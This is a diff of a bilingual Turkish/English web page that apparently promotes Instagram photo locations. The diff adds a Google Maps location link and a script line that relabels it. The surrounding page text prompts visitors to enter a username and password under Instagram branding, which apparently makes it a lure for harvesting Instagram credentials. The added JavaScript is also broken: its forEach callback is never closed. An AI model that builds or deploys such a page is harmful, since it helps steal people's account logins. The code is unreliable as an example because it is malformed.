@@ -128,6 +128,8 @@
       <img src="https://res.cloudinary.com/dnkrwesdr/image/upload/v1746083288/screenshot_fx7okx.jpg" alt="Instagram Sayfamız">
       <br>
       Beğendiğimiz çekim noktalarını bu sitede paylaşıyoruz.<br>
+      <a class="map-link" href="https://www.google.com/maps/place/CVK+Park+Bosphorus+Hotel+Istanbul/@41.035329,28.9883417,3a,75y,90t/data=!3m8!1e2!3m6!1sAF1QipMTSDYuafp9M0yAfHyXPURzRIaOti0IDYXTsDlI!2e10!3e12!6shttps:%2F%2Flh3.googleusercontent.com%2Fp%2FAF1QipMTSDYuafp9M0yAfHyXPURzRIaOti0IDYXTsDlI%3Dw203-h133-k-no!7i3600!8i2372!4m10!3m9!1s0x14cab7f1fe239f43:0x54477a917ddd623d!5m2!4m1!1i2!8m2!3d41.0349711!4d28.9884045!10e5!16s%2Fg%2F1ptw2kx86?entry=ttu&g_ep=EgoyMDI1MDQyOC4wIKXMDSoASAFQAw%3D%3D" target="_blank">📍Konum</a>
+
 
       Eminiz ki senin bulunduğun yerde de harika manzaralar var!<br>
       Instagram’dan bize yazabilirsin.<br>
@@ -162,6 +164,8 @@
 
     if (!lang.startsWith('tr')) {
       document.getElementById('title').innerHTML = `Discover🔍🌍<br> secret locations📍<br>for your next viral🔥 <br>Instagram 📸 shot!`;
+      document.querySelectorAll('.map-link').forEach(link => {
+        link.innerHTML = '📍 Location';
       document.getElementById('subtitle').textContent = 'Enter your username and password:';
       document.getElementById('usernameInput').placeholder = 'Username';
       document.getElementById('passwordInput').placeholder = 'Password';
